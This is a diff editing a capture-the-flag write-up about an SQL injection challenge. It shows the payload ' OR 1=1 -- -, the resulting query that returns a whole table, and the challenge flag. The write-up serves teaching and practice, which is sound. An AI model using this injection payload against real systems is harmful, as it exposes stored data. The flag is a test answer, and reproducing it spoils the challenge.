@@ -15,9 +15,9 @@ Having opened the link, we see a site with a sign. Having tried to ask several q
 
 Use payload: ```' OR 1=1 -- -```
 
-The result is a query ```SELECT * FROM table WHERE name = '' OR 1=1 -- -'``` Which means we display the entire contents of the table
+The result query will look like this: ```SELECT * FROM table WHERE name = '' OR 1=1 -- -'```
 
-You can read more at https://portswigger.net/web-security/sql-injection
+You can read more at https://portswigger.net/web-security/sql-injection about how SQL injections works
 
 ---
 The flag is: ```CCC{5Ql_1s_FuN!}```
